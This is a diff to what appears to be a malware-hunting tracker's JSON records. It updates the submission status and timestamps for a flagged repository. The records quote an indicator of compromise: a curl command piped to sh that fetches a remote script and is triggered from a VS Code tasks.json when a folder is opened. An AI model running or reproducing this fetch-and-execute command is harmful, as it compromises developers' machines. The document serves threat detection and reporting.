@@ -18,10 +18,10 @@
     "iocs": "curl 'codeviewer-three.vercel.app/task/mac?token=31d0937f1234' | sh; .vscode/tasks.json",
     "matched_signatures": "folderOpen curl filename:tasks.json",
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
-    "osm_status": "not_submitted",
-    "osm_threat_id": "",
-    "first_seen": "hunt-20260923T001603Z",
-    "last_seen": "hunt-20260923T001603Z",
+    "osm_status": "submitted",
+    "osm_threat_id": "3bbd5ca7-4930-4a94-b1aa-bcdf210019bd",
+    "first_seen": "hunt-20260925T173032Z",
+    "last_seen": "hunt-20260925T173032Z",
     "evidence_file": "repositories/yaroslav781_drainer.json",
     "reviewer_decision": "",
     "notes": ""
@@ -68,7 +68,7 @@
     "evidence_references": "https://github.com/yaroslav781/drainer/blob/ce0b392a130627dce2bd260cc9b0eb172f79d930/.vscode/tasks.json\nhttps://github.com/yaroslav781/drainer/blob/ce0b392a130627dce2bd260cc9b0eb172f79d930/socket/index.js#L61",
     "verified_iocs": "curl 'codeviewer-three.vercel.app/task/mac?token=31d0937f1234' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-23T00:16:03Z",
-    "last_seen": "2026-09-23T00:16:03Z"
+    "first_seen": "2026-09-25T17:30:32Z",
+    "last_seen": "2026-09-25T17:30:32Z"
   }
 }
